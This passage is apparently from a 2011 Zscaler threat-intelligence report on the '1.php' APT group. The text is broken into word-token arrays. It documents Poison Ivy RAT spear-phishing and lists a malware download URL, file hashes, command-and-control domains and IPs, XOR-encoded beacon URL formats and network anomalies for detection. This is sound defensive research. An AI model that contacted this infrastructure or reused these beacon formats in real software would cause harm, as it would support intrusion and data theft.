"a"], ["Poison", "Ivy", "RAT", "variant", "."], ["\u201c"], ["Section", "1:"], ["-Zscaler", "ThreatLabZ"], ["provides", "a", "malicious", "link", "to:"], ["File", "name:", "WWW", ".", "DREAMLIFES.NET/Afghanistan/Afghanistan.zip."], ["MD5:", "052E62513505A25CCFADF900A052709C"], ["Once", "unzipped", ",", "the", "malware", "is", "a", "Windows", "executable", "with", "an", "SCR"], ["extension", "that", "is", "identified", "as", "a", "Poison", "Ivy", "RAT", "variant", ".", "Beyond", "simple"], ["phishing", "attacks", "with", "links", "to", "malware", ",", "the", "Group", "also", "sends", "spearphishing", "emails", "with", "malicious", "PDF", "attachments", "to", "their", "targets", ".", "For"], ["example", ",", "the", "SANS", "ISC", "Handler\u2019s", "Diary", "drew", "attention", "to", "this", "Group\u2019s"], ["phishing", "campaign", "exploiting", "CVE-2009-4324", "in", "January", "2010", ".", "A"], ["screenshot", "of", "their", "story", "headline", "is", "below", "in:", "Figure", "1", "SANS", "ISC", "Diary"], ["Headline", "related", "to", "\u201c1", ".", "php\u201d", "malware", "campaign3", "."], ["Figure", "1", "SANS", "ISC", "Diary", "Headline", "related", "to", "\u201c1", ".", "php\u201d", "malware", "campaign"], ["An", "example", "of", "one", "of", "the", "Poison", "Ivy", "RAT", "payloads", "used", "during", "this"], ["campaign", "was:"], ["File", "name:", "SUCHOST", ".", "EXE", "dropped", "from", "Request", ".", "pdf", "email", "attachment"], ["MD5:", "B0EECA383A7477EE689EC807B775EBBB"], ["2", ".", "http://contagiodump", ".", "blogspot.com/2009/12/attack-of-day-poison-ivy-zip-download.html"], ["3", ".", "http://isc", ".", "sans.edu/diary.html?storyid=7867"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "5"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["This", "file", "received", "commands", "from:", "CECON", ".", "FLOWER-SHOW.ORG."], ["More", "recently", ",", "in", "July", "2011", ",", "open-source", "reports4", "exist", "of", "Poison", "Ivy"], ["usage", "surrounding", "the", "FLOWER-SHOW", ".", "ORG", "domain", ".", "This", "incident"], ["exploited", "PDF", "vulnerabilities", "(CVE-2010-2883)", "in", "attached", "spear-phishing"], ["emails", "targeting", "experts", "on", "Japan", ",", "China", ",", "Taiwan", "/", "USA", "relationships", "."], ["See", "a", "screenshot", "of", "the", "email", "in:", "Figure", "2", "Spear-phishing", "email", "with"], ["attachment", "exploiting", "CVE-2010-2883", "."], ["Figure", "2", "Spear-phishing", "email", "with", "attachment", "exploiting", "CVE-2010-2883"], ["Once", "the", "Poison", "Ivy", "payload", "is", "installed", ",", "it", "frequently", "uses", "a", "unique"], ["beaconing", "pattern", "to", "communicate", "with", "a", "C&C", "server", ".", "To", "illustrate", "the"], ["communication", "sequence", ",", "reference", "the", "Joebox", "sandbox", "report5", "for", "the"], ["following", "file:"], ["File", "name:", "Halloween", ".", "scr"], ["MD5:", "5B90896127179F0AD2E6628593CDB60D"], ["4", ".", "http://contagiodump", ".", "blogspot.com/2011/07/jul-13-cve-2010-2883-pdf-meeting-agenda.html"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "6"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u2022"], ["Communicates", "with", "C&Cs:"], ["\u2013", "FREE", ".", "COFFEELAUCH.COM", "(98", ".", "126.69.3)"], ["\u2013", "FIREHAPPY", ".", "SYTES.NET", "*", "(98", ".", "126.69.3)"], ["\u2022"], ["Via", "HTTP", "GET", "requests", "to", "the", "path:", "/1", ".", "php?id=[data1]&id=[data2]"], ["&id=[data3]&id=[data4]&id=&id="], ["\u2013", "2", ".", "php,", "3", ".", "php,", "and", "4", ".", "php", "with", "id", "parameters", "and", "some", "with", "an"], ["ending", "&Done", "have", "also", "been", "observed"], ["\u2013", "The", "data", "parameters", "are", "information", "about", "the", "infected", "host", "(IP", ","], ["hostname", ",", "MAC", "address", ",", "username", ",", "and", "OS/system", "version)", "that"], ["have", "been", "base64", "encoded", "and", "then", "XORed", ".", "XOR", "keys", "of", "0x3C"], ["and", "0x3E", "have", "been", "observed", "."], ["An", "asterisk", "following", "a", "domain", "will", "designate", "No-IP6", "dynamic", "DNS"], ["\u201c"], ["The", "\u201c1", ".", "php?=\u201d"], ["HTTP", "GET", "request", "for"], ["the", "initial", "C&C", "checkin", "has", "been", "identified"], ["in", "the", "majority", "of", "past"], ["incidents", "involving"], ["this", "Group", "and", "is"], ["the", "reason", "for", "the"], ["informal", "\u201c1", ".", "php\u201d"], ["name", "used", "to"], ["describe", "this", "intrusion"], ["set", "."], ["\u201c"], ["This", "report", "shows", "that", "once", "infected", ",", "the", "victim:"], ["-Zscaler", "ThreatLabZ"], ["domains", "in", "this", "report", ".", "Dynamic", "DNS", "is", "a", "service", "that", "provides", "free", ","], ["cheap", "flexible", "domain", "hostname", "to", "IP", "address", "resolution", "and", "No-IP", "is"], ["one", "of", "the", "many", "vendors", "in", "this", "space", "."], ["While", "the", "malware", "variants", "used", "are", "generally", "referred", "to", "as", "Poison"], ["Ivy", "variants", ",", "there", "are", "many", "cases", "of", "them", "being", "detected/labeled", "as", "a"], ["generic", "Trojan", ",", "Backdoor", ",", "or", "something", "else", "entirely", ".", "For", "example", ",", "in", "a"], ["December", "2009", "malware", "report", "Kaspersky", "lists", "one", "variant", "as", "Trojan", "."], ["Win32", ".", "Buzus.cvdu7", "and", "in", "June", "2010", "another", "as", "Trojan", ".", "Win32.Agent."], ["eevf8", "", "."], ["Note", "the", "\u201c1", ".", "php?id=\u201d", "HTTP", "GET", "request", "for", "the", "initial", "C&C", "check-in", "."], ["This", "specific", "behavior", "has", "been", "identified", "in", "the", "vast", "majority", "of", "past"], ["incidents", "involving", "this", "Group", "and", "is", "reason", "for", "the", "informal", "\u201c1", ".", "php\u201d"], ["name", "used", "to", "describe", "these", "intrusion", "sets", "within", "the", "report", ".", "More"], ["information", "may", "be", "garnered", "from", "the", "open-source", "community", ",", "but", "the"], ["above", "should", "be", "a", "sufficient", "introduction", "into", "the", "tactics", ",", "techniques", ",", "and"], ["procedures", "(TTPs)", "of", "this", "Group", "."], ["5", ".", "http://support", ".", "clean-mx.de/clean-mx/view_joebox.php?md5=9339bb2af4d8c07e63051d0f120530e1&id=679603"], ["6", ".", "http://www", ".", "no-ip.com/services/managed_dns/free_dynamic_dns.html"], ["7", ".", "http://www", ".", "securelist.com/en/descriptions/7383071/Trojan.Win32.Buzus.cvdu"], ["8", ".", "http://www", ".", "securelist.com/en/descriptions/7854148/Trojan.Win32.Agent.eevf"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "7"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Zscaler", "has", "observed", "on-going", "attacks", "from", "June", "2010", "to", "present", ","], ["involving", "a", "Cleared", "Defense", "Contractor", ".", "Given", "the", "entity", "involved", "and", "the"], ["characteristics", "of", "the", "traffic", "observed", ",", "Zscaler", "believes", "that", "the", "attack", "is"], ["directly", "related", "to", "the", "\u201c1", ".", "php\u201d", "Group", ".", "While", "these", "attacks", "appear", "related"], ["to", "the", "\u201c1", ".", "php\u201d", "Group", ",", "the", "beacons", "do", "not", "bear", "the", "previously", "mentioned"], ["\u201c1", ".", "php\u201d", "HTTP", "path", ".", "However", ",", "there", "are", "many", "similarities", "regarding"], ["these", "\u201cnew\u201d", "beacons", "as", "well", "as", "direct", "relationships", "regarding", "previously"], ["\u201c"], ["Zscaler", "believes", "that"], ["ongoing", "attacks", "against"], ["a", "sensitive", "customer", "are"], ["directly", "related", "to", "the"], ["\u201c1", ".", "php\u201d", "Group", "."], ["\u201c"], ["Section", "2:", "Customer", "Infection", "Behavior"], ["-Zscaler", "ThreatLabZ"], ["identified", "domains", "and", "IPs", "used", "by", "the", "\u201c1", ".", "php\u201d", "group", ".", "Presumably", ","], ["these", "\u201cnew\u201d", "beacon", "behaviors", "have", "been", "altered", "to", "evade", "any"], ["signatures", "designed", "to", "detect", "the", "previous", "\u201c1", ".", "php\u201d", "beaconing", "behavior", "."], ["2", ".", "1", "GET", "Beacons", "with", "Modified", "XOR", "Parameters"], ["One", "of", "the", "first", "variations", "that", "we", "noticed", "in", "the", "attacks", ",", "was", "that", "the"], ["infected", "hosts", "sent", "HTTP", "GET", "request", "check-ins", "to", "URLs", "with", "the"], ["general", "pattern", "of:"], ["FQDN/css", ".", "ashx?sc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d"], ["ata5]&tk="], ["The", "data", "parameters", "contained", "the", "same", "victim", "information", "as"], ["mentioned", "in", "the", "\u201c1", ".", "php\u201d", "beacons", "and", "were", "also", "base64", "encoded"], ["and", "XORed", "with", "a", "key", ".", "Examples", "of", "C&Cs", "that", "we", "observed", "for", "this"], ["particular", "check-in", "variant", "include:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["HOUSE", ".", "SUPERDOGDREAM.COM"], ["HOME", ".", "ALLMYDEARFRIENDS.COM"], ["GOOGLETIME", ".", "SERVEIRC.COM", "*"], ["INFO", ".", "SPORTGAMEINFO.COM"], ["PEOPLE", ".", "ENJOYHOLIDAYS.NET"], ["PEARHOST", ".", "SERVEHALFLIFE.COM", "*"], ["(June", "2010", "\u2013", "1st", "C&C", "observed", "in", "infection)"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "8"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["The", "next", "variation", "that", "we", "noticed", "in", "attacks", ",", "involved", "the", "infected", "hosts"], ["sending", "HTTP", "GET", "request", "check-ins", "to", "URLs", "with", "the", "general", "pattern", "of:"], ["FQDN/[data1]/[data2]/[data3]/[data4]/[data5]"], ["The", "data", "did", "not", "appear", "to", "be", "XORed", "in", "the", "same", "manner", "as", "the", "beacons"], ["that", "were", "previously", "identified", ".", "However", ",", "based", "on", "size", "and", "number", "of"], ["data", "blocks", ",", "it", "appears", "that", "the", "beacons", "contain", "similar", "information", "from"], ["the", "victims", ".", "Examples", "of", "C&Cs", "used", "in", "this", "infection", "variant", "include:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["SATELLITE", ".", "QUICKSEARCHMOVIE.COM"], ["WWW", ".", "TOYHOPING.COM"], ["WORK", ".", "FREETHROWLINE.NET"], ["SEA", ".", "ANIMALFANS.NET"], ["WWW", ".", "SEARCHSEA.NET"], ["LOVE", ".", "ANIMALFANS.NET"], ["WWW", ".", "JOBCALL.ORG"], ["\u201c"], ["\u2026it", "is", "currently"], ["believed", "that", "the"], ["infection", "point", "was"], ["through", "malicious", "email"], ["attachments", "(as", "was", "the"], ["case", "in", "many", "of"], ["the", "\u201c1", ".", "php\u201d", "OSINT"], ["incidents)", "."], ["\u201c"], ["2", ".", "2", "GET", "Beacons", "with", "Data", "moved", "to", "URL", "path"], ["-Zscaler", "ThreatLabZ"], ["2", ".", "3", "HTTPS", "CONNECTs", "to", "C&Cs"], ["The", "latest", "variations", "on", "these", "attacks", "are", "related", "to", "customer", "infections"], ["beginning", "on", "August", "3", ",", "2011", ".", "Prior", "to", "infection", "for", "this", "incident", ",", "as", "well"], ["as", "the", "previous", "ones", "listed", ",", "web", "transaction", "logs", "did", "not", "provide", "any"], ["strong", "evidence", "of", "the", "infection", "point", "\u2013", "it", "is", "currently", "believed", "that", "the"], ["infection", "point", "was", "through", "malicious", "email", "attachments", "(as", "was", "the"], ["case", "in", "many", "of", "the", "\u201c1", ".", "php\u201d", "OSINT", "incidents)", ".", "Following", "infection", ",", "many"], ["web", "transactions", "were", "witnessed", "each", "hour", "to", "the", "C&C", "servers", "via"], ["HTTPS", "with", "the", "following", "behaviors:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["CONNECT", "on", "port", "443/TCP", "with", "200", "HTTP", "response", "code"], ["HTTP", "request", "version", "1", ".", "0", "with", "HTTP", "response", "version", "1", ".", "1"], ["Request", "size", "for", "\u201ckeep-alive\u201d", "beacons", "were", "primarily", "227", "\u2013", "228", "bytes"], ["Response", "size", "is", "most", "commonly", "between", "969", "\u2013", "990", "bytes"], ["Microsoft", "Internet", "Explorer", "6", ".", "0", "user-agent", "string", "(hard-coded", "into"], ["malware", ",", "as", "this", "is", "not", "a", "standard", "browser", "for", "this", "customer)"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "9"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Examples", "of", "C&Cs", "used", "in", "this", "infection", "variant", "include:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["WWW", ".", "SAVAGECOUNTY.NET"], ["LOOK", ".", "CAPTAINSABERTOOTH.NET"], ["GEOINFO", ".", "SERVEHTTP.COM", "*"], ["ROSE", ".", "OFFICESKYLINE.COM"], ["WWW", ".", "CAREERCHALLENGES.NET"], ["OFFER", ".", "AMERICAMS.N"], ["Section", "3:", "Incident", "Inter-Relationships"], ["There", "are", "a", "number", "of", "domains", "and", "IP", "addresses", "that", "have", "been", "tied", "to"], ["the", "previously", "mentioned", "incidents", ".", "Toward", "the", "beginning", "of", "the", "report"], ["it", "was", "stated", "that", "we", "believed", "all", "of", "these", "incidents", "to", "be", "related", ".", "As"], ["has", "already", "been", "seen", ",", "there", "are", "some", "similarities", "across", "the", "incidents", ","], ["such", "as", "same", "victim", "organization", ",", "similar", "beaconing", "data", "blocks", ",", "and"], ["infection", "believed", "to", "be", "from", "malicious", "email", "attachments", ".", "However", ",", "the"], ["strongest", "evidence", "for", "their", "relationship", "is", "the", "fact", "that", "related", "domains"], ["and", "IPs", "are", "used", "for", "C&Cs", "across", "these", "incidents", "."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "10"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["The", "following", "Figure", "3", "-", "Link-Graph", "of", "\u201c1", ".", "php\u201d", "Incident", "Inter-Relationship"], ["provides", "this", "illustration", "with", "only", "a", "small", "snippet", "of", "information", "from"], ["these", "incidents:"], ["DOMAIN"], ["firehappy", ".", "sytes.net"], ["OSINT", "\u201c1", ".", "php\u201d", "Incidents"], ["coffeelaunch", ".", "com"], ["HOSTNAME"], ["IP", "RESOLUTION"], ["free"], ["image"], ["98", ".", "126.69.3"], ["dreamlifes", ".", "net"], ["tastfine"], ["Zhang", ",", "Yao", "hua\u201d", "Registration", "details"], ["ICP100", ".", "net", "nmaeservers"], ["seablow", ".", "net"], ["superdogdream", ".", "com"], ["house"], ["allmydearfriends", ".", "com"], ["do:"], ["2", ".", "1", "Incidents"], ["sportgameinfo", ".", "com"], ["enjoyholidays", ".", "net"], ["2", ".", "2", "Incidents"], ["jobcall", ".", "org"], ["geoinfo", ".", "servehttp.com"], ["dream"], ["smart"], ["178", ".", "63.130.197"], ["rose"], ["2", ".", "3", "Incidents"], ["46", ".", "4.209.130"], ["officeskyline", ".", "com"], ["qinetiq"], ["captainsabertooth", ".", "net"], ["qnao"], ["savagecounty", ".", "net"], ["Example", "of", "Possible"], ["Victim", "Names"], ["look"], ["Figure", "3", "-", "Link-Graph", "of", "\u201c1", ".", "php\u201d", "Incident", "Inter-Relationship"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["www"], ["Page", "11"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Past", "experience", "with", "APT-style", "incidents", "show", "that", "hostnames", "may", "be"], ["used", "to", "identify", "the", "C&C", "for", "particular", "victims", "of", "interest", ".", "For", "example", ","], ["in", "bakerhughes", ".", "thruthere.net9", "was", "a", "C&C", "used", "against", "Baker", "Hughes"], ["in", "the", "disclosed", "Night", "Dragon10", "attacks", ".", "There", "have", "been", "a", "number"], ["of", "interesting", "hostnames", "used", "with", "\u201c1", ".", "php\u201d", "C&C", "domains", "that", "may"], ["indicate", "other", "potential", "victims", ".", "These", "hostnames", "potentially", "identify"], ["victims", "within", "the", "US", "Government", "(USG)", ",", "Defense", "Industrial", "Base", "(DIB)", ","], ["and", "Geospatial", "industry", ".", "The", "above", "link-graph", "provides", "one", "example", "of"], ["such", "an", "entity", "that", "has", "information", "about", "its", "attacks", "already", "disclosed", "in"], ["\u201c"], ["There", "have", "been", "a"], ["number", "of", "interesting"], ["hostnames", "used", "with"], ["\u201c1", ".", "php\u201d", "C&C", "domains"], ["that", "may", "include", "other"], ["potential", "victims", "."], ["\u201c"], ["3", ".", "1", "Possible", "Relationship", "to", "Other", "APT", "Incidents"], ["-Zscaler", "ThreatLabZ"], ["the", "open-source", "(QinetiQ)", "."], ["\u201cQINETIQ\u201d", "or", "\u201cQNAO\u201d", "(QinetiQ", "North", "America", "Operations)", "for", "example", ","], ["was", "an", "HBGary", "customer", ".", "HBGary", "supported", "QinetiQ", "in", "detection"], ["and", "analysis", "of", "on-going", "targeted", "attacks", "against", "them", ".", "Following", "the"], ["Anonymous", "compromise", "and", "leakage", "of", "HBGary", "information", ",", "there", "is"], ["significant", "information", "in", "the", "public", "domain", "regarding", "the", "attacks", "against"], ["QinetiQ", ".", "One", "such", "example", "is", "HBGary\u2019s", "Incident", "Response", "Technical"], ["Report", "Supplement", "for", "QinetiQ11", "", ".", "Page", "8", "of", "that", "report", ",", "in", "the", "\u201cHistory"], ["of", "the", "strain\u201d", "section", "states:"], ["HBGary", "has", "code-named", "this", "threat", "group", "as", "\u201cSoysauce\u201d", ".", "This", "group"], ["is", "also", "known", "as", "\u201cComment", "Crew\u201d", "by", "some", ",", "and", "also", "as", "\u201cGIF89a\u201d", "by"], ["some", ".", "The", "choice", "of", "codename", "is", "completely", "arbitrary", "in", "this", "context"], ["and", "is", "simply", "meant", "to", "identify", "a", "group", "of", "Chinese", "hackers", "who", "have"], ["a", "consistent", "agenda", "to", "target", "the", "defense", "industrial", "complex", "."], ["The", "name", "\u201cComment", "Crew\u201d", "and", "\u201cGIF89a\u201d", "has", "been", "used", "by"], ["researchers", "because", "of", "the", "behavior", "of", "this", "group", "to", "enclose", "C&C"], ["commands", "within", "comments", "on", "HTML", "pages", "or", "hidden", "within", "image"], ["files", ",", "a", "technique", "known", "as", "steganography", ".", "These", "indicators", "have", "not"], ["been", "witnessed", "in", "the", "attacks", "previously", "listed", "in", "this", "report", "."], ["Beyond", "a", "likely", "QinetiQ", "attack", "relation", ",", "there", "are", "a", "number", "of", "other"], ["hostnames", "that", "indicate", "potential", "attack", "targets", "of", "the", "\u201c1", ".", "php\u201d", "Group", "."], ["Disclosure", "of", "other", "possible", "victim", "names", "is", "intentionally", "omitted", "from"], ["this", "report", "."], ["9", ".", "http://hbgary", ".", "anonleaks.ch/greg_hbgary_com/2505.html"], ["10", ".", "http://www", ".", "mcafee.com/in/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf"], ["11", ".", "http://publicintelligence", ".", "info/HBGary-QinetiQ.pdf"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "12"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Section", "4:", "Lessons", "Learned"], ["A", "number", "of", "lessons", "can", "be", "learned", "from", "analyzing", "incidents", "within"], ["this", "intrusion", "set", ".", "In", "the", "following", "section", ",", "we", "will", "discuss", "analytical"], ["techniques", "that", "enterprises", "should", "be", "adopting", ",", "in", "order", "to", "uncover"], ["similar", "attacks", "on", "their", "organizations", "."], ["4", ".", "1", "Conduct", "logging", "and", "analytics", "within", "your", "environment"], ["This", "report", "shows", "an", "evolution", "of", "the", "beaconing", "behavior", "from", "the"], ["\u201c1", ".", "php\u201d", "Group", ".", "Relying", "solely", "on", "existing", "signatures", "of", "known", "threats"], ["would", "not", "have", "triggered", "detections", ".", "By", "identifying", "transactions", "that"], ["are", "anomalous", ",", "it", "is", "possible", "to", "detect", "previous", "or", "recurring", "incidents", ","], ["such", "as", "those", "identified", "above", ".", "Some", "of", "the", "anomalies", ",", "which", "led", "to", "the"], ["findings", "in", "this", "report", ",", "include:"], ["\u2022"], ["HTTP", "version", "1", ".", "0", "requests", "with", "version", "1", ".", "1", "responses"], ["\u2022"], ["Numerous", "transactions", "to", "an", "unknown", "/", "uncategorized", "domain"], ["\u2013", "Some", "of", "these", "transactions", "were", "to", "No-IP", "dynamic", "DNS", "domains"], ["\u2022", "Blocking", "or", "heavily", "monitoring", "the", "communication", "to", "dynamic"], ["DNS", "domains", "is", "recommended"], ["\u2013", "Some", "of", "these", "domains", "were", "parked"], ["\u2013", "Transactions", "occur", "during", "non-standard", "times", "(nights", "/", "weekends)"], ["\u2013", "Some", "transactions", "(in", "particular", "the", "GET", "beacons)", "had", "a", "larger"], ["request", "size", "than", "response", "size"], ["\u2022"], ["Microsoft", "IE", "6", "user-agent", "(UA)", "string", "usage", "in", "an", "environment", "that"], ["does", "not", "typically", "use", "this", "UA"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "13"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["By", "leveraging", "data", "sources", "such", "as", "passive", "DNS", ",", "domain", "registration"], ["information", ",", "other", "open-source", "reports", ",", "and", "other", "research", "-", "it", "is", "possible"], ["to", "derive", "information", "about", "probable", "domains", "and", "infrastructure", "used", ","], ["in", "other", "attacks", "by", "the", "same", "group", "of", "attackers", ".", "In", "some", "cases", ",", "this"], ["information", "may", "provide", "indicators", "as", "to", "the", "targets", "or", "purpose", "of", "the"], ["attacks", ".", "It", "should", "also", "be", "noted", "that", "making", "too", "many", "assumptions", "or"], ["believing", "unverified", "indicators", "as", "fact", "can", "lead", "to", "misleading", "information", "."], ["Anyone", "can", "set", "a", "hostname", "for", "a", "C&C", "to", "be", "\u201cQINETIQ\u201d", "for", "example", "."], ["However", ",", "by", "correlating", "these", "domains", "with", "a", "group", "that", "has", "been"], ["identified", "as", "being", "involved", "in", "APT", "attacks", ",", "provides", "a", "stronger", "indication"], ["into", "their", "possible", "target", "."], ["\u201c"], ["While", "the", "exploitation"], ["used", "in", "some", "of"], ["the", "crafted", "PDF"], ["attachments", "may", "be"], ["considered", "advanced", ","], ["for", "the", "most", "part", "the"], ["attack", "is", "one", "of"], ["social-engineering", "."], ["\u201c"], ["4", ".", "2", "Correlate", "with", "other", "sources"], ["-Zscaler", "ThreatLabZ"], ["4", ".", "3", "APTs", "are", "not", "always", "that", "\u2018Advanced\u2019"], ["The", "above", "incident", "reports", "document", "(spear-)", "phishing", "with", "a", "malicious"], ["PDF", "attachment", ",", "or", "link", "to", "a", "binary", "executable", "with", "a", "Poison", "Ivy", "RAT"], ["payload", ".", "While", "the", "exploitation", "used", "in", "some", "of", "the", "crafted", "PDF"], ["attachments", "may", "be", "considered", "advanced", ",", "for", "the", "most", "part", "the", "attack", "is"], ["one", "of", "social-engineering", ".", "This", "is", "nothing", "new", "and", "something", "that", "other"], ["fraudsters", "/", "criminals", "have", "been", "leveraging", "for", "many", "years", ".", "RSA", "recently"], ["wrapped", "up", "their", "APT", "summit", "and", "their", "first", "finding", "concluded", "that", "the"], ["\u201cattack", "vector", "[is]", "shifting", "from", "technology", "to", "people\u201d", ".", "12"], ["4", ".", "4", "APTs", "are", "not", "limited", "to", "the", "United", "States", "Government"], ["or", "Defense", "Industrial", "Base"], ["The", "victim", "related", "to", "this", "report", "is", "neither", "a", "Government", "agency", ",", "nor"], ["an", "entity", "that", "would", "normally", "be", "associated", "with", "the", "Defense", "Industrial"], ["Base", ".", "While", "this", "report", "does", "list", "USG", "(United", "State", "Government)", "and"], ["DIB", "(Defense", "Industrial", "Base)", "entities", "as", "possible", "victims", ",", "there", "are", "many"], ["more", "commercial", "entities", "within", "the", "Geospatial", "and", "Telecommunication"], ["industries", "that", "appear", "to", "have", "been", "victims", "of", "this", "Group", ".", "Zscaler", "has"], ["noted", "both", "foreign", "and", "domestic", "entities", "that", "have", "been", "victims", "of", "other"], ["APT", "incidents", "as", "well", "."], ["12", ".", "http://www", ".", "rsa.com/summitresults"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "14"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["4", ".", "5", "APT", "Information", "Disclosure", "Remains", "a", "Challenge"], ["Incident", "Information", "Disclosure", "is", "an", "extension", "to", "the", "heated", "debate"], ["around", "vulnerability", "information", "disclosure", ",", "and", "full-disclosure", "versus"], ["responsible-disclosure", ".", "Responsible-disclosure", "is", "fairly", "well", "defined", "and"], ["adopted", "within", "the", "vulnerability", "space", ",", "but", "it", "is", "not", "within", "the", "incident"], ["space", "."], ["Here", "are", "some", "arguments", "for", "\u201cfull", "disclosure\u201d", "of", "incident", "information:"], ["\u2022", "A", "larger", "community", "of", "awareness", "(and", "thus", "potential", "detection"], ["possibility)", ",", "particularly", "if", "there", "are", "more", "organizations", "impacted"], ["\u2022", "A", "general", "philosophy", "that", "information", "should", "be", "public", "and", "that", "the"], ["Government", "or", "information", "security", "community", "should", "not", "have"], ["secrets", "kept", "from", "the", "public"], ["\u2022", "The", "public", "should", "be", "made", "aware", "of", "which", "organizations", "have", "been"], ["victimized", "so", "that", "this", "information", "and", "their", "response", "can", "be", "weighed"], ["before", "trusting", "them", "again", "in", "the", "future"], ["Here", "are", "some", "arguments", "for", "\u201cresponsible", "disclosure\u201d", "(the"], ["selective", "release", "of", "information", "to", "specific", "parties)", "of", "incident", "information"], ["\u2022", "Public", "release", "will", "cause", "the", "attacker", "to", "alter", "their", "TTPs", "and", "possibly"], ["allow", "them", "to", "make", "changes", "to", "infected", "systems", "prior", "to", "incident"], ["response", "action", ",", "making", "detection", "more", "difficult"], ["\u2022", "Public", "release", "of", "information", "can", "be", "viewed", "as", "attempting", "to", "garner"], ["the", "spotlight", "for", "financial", "motives", "versus", "genuine", "concerns", "about"], ["security"], ["\u2022", "There", "may", "be", "law", "enforcement", "(or", "other)", "investigations", "that", "are"], ["on-going", "and", "such", "a", "release", "of", "information", "could", "compromise", "the"], ["investigation"], ["Zscaler", "adheres", "to", "the", "following", "general", "principals", "for", "incident/"], ["vulnerability", "disclosure:"], ["\u2022", "Customer", "specific", "information", "is", "disclosed", "only", "to", "the", "impacted"], ["customer"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "15"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u2022", "Customer", "information", "will", "be", "redacted", "prior", "to", "public", "disclosure"], ["or", "disclosure", "to", "other", "impacted", "parties", ",", "stake-holders", ",", "and", "trusted"], ["groups", "within", "the", "information", "security", "community"], ["\u2022", "Public", "disclosure", "will", "provide", "high-level", "indicators", "of", "compromise"], ["(such", "as", "general", "network", "behavior", "and", "malicious", "domains)", "without"], ["the", "release", "of", "specifics", "as", "to", "which", "organizations", "were", "impacted", "and"], ["is", "done", "so", "when", "it", "is", "believed", "that", "such", "information", "will", "benefit", "others"], ["in", "protecting", "against", "similar", "threats"], ["\u2022", "Based", "on", "feedback/approval", "from", "the", "impacted", "parties", ",", "stake-holders", ","], ["and", "information", "security", "community", "\u2013", "additional", "information", "may", "be"], ["released", "to", "the", "public"], ["Zscaler", "is", "willing", "to", "share", "additional", "details", "of", "the", "incidents", "discussed"], ["in", "this", "report", "with", "trusted", "groups", "within", "the", "information", "security"], ["community", "to", "help", "further", "their", "research", "with", "regard", "to", "similar", "incidents", "."], ["If", "you", "are", "interested", "in", "sharing", "data", "on", "this", "and", "other", "incidents", ",", "we"], ["encourage", "you", "to", "contact", "us", "at", "threatlabz@zscaler", ".", "com."], ["Conclusion"], ["By", "interrogating", "Zscaler\u2019s", "comprehensive", "logging", "repository", "for"], ["anomalous", "activity", "and", "indicators", "of", "compromise", ",", "a", "Zscaler", "ThreatLabZ"], ["researcher", "identified", "a", "high-risk", "entity", "victimized", "by", "a", "possible", "APT", "attack"], ["linked", "to", "the", "\u201c1", ".", "php\u201d", "Group", ".", "The", "conclusion", "that", "these", "attacks", "should", "be"], ["classified", "as", "an", "APT", "attack", "are", "based", "on", "the", "following", "indicators:"], ["\u2022", "The", "victim", "enterprise", "is", "a", "high", "risk", "target", ",", "involved", "in", "an", "industry", "that"], ["has", "regularly", "been", "targeted", "in", "similar", "attacks"], ["\u2022", "Linkages", "were", "identified", "among", "several", "previous", "incidents", "from", "2010"], ["to", "present", ",", "showing", "persistence"], ["\u2022", "There", "remains", "little", "to", "no", "open-source", "information", "on", "the", "domains", "/"], ["IPs", "used", "in", "the", "attack", ",", "and", "the", "linkage", "to", "open-source", "reports", "shows", "a"], ["correlation", "with", "past", "APT", "incidents"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "16"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["APT", "incidents"], ["\u2022", "Some", "No-IP", "dynamic", "DNS", "domains", "used", "(while", "a", "weak", "APT", "indicator", ","], ["dynamic", "DNS", "domains", "have", "often", "been", "used", "among", "documented", "APT"], ["incidents", ",", "such", "as", "Aurora", "and", "Night", "Dragon)"], ["\u2022", "Hostnames", "related", "to", "victims", "are", "used", ",", "which", "is", "a", "technique"], ["previously", "documented", "in", "other", "APT", "attacks"], ["\u2022", "Nameserver", "and", "domain", "registration", "information", "indicates", "likely"], 